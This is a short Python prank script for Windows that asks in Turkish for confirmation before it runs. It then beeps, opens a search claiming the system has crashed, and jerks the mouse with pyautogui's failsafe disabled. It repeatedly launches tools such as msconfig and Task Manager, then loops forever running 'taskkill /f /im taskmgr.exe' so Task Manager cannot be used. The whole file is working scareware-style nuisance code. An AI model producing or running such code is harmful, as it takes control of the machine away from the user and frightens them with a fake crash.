import tkinter
from tkinter import *
from tkinter import messagebox
import pyautogui
import subprocess
from os import system 
import time
from time import sleep
import random
import winsound
from PIL import Image, ImageDraw
root = Tk()
root.geometry("200x200")
pyautogui.FAILSAFE = False
def mouse():
     for _ in range(5):
       pyautogui.moveTo(324,234) 
       sleep(0.1)
       pyautogui.moveTo(768,435)
       sleep(0.1)
       pyautogui.moveTo(584,340)
       sleep(0.1)
       pyautogui.moveTo(145,843)
       sleep(0.1)
       pyautogui.moveTo(745,304)
       sleep(0.1)
       pyautogui.moveTo(343,324)
def randomapps():
     apps = ["notepad.exe","taskmgr.exe","msconfig.exe","calc.exe"]
     randommer = random.choice(apps)
     subprocess.run(randommer)
def beepSounds():
   frequency = 500
   duration = 1000
   winsound.Beep(frequency,duration)
def pessible():
  message = tkinter.messagebox.askquestion("DASH","Bu programı cidden çalıştırmak istiyor musunuz ?")
  if message == "yes" :
    beepSounds()
    system("start https://www.google.com/search?q=your+system+has+been+crash")
    mouse()
    randomapps()
    beepSounds()
    mouse()
    randomapps()
    randomapps()
    randomapps()
    mouse()
    beepSounds()
    beepSounds()
    mouse()
    randomapps()
    mouse()
    beepSounds()

    while True :
      system("taskkill /f /im taskmgr.exe")
      print ("less")
  else :
    exit()

pessible()


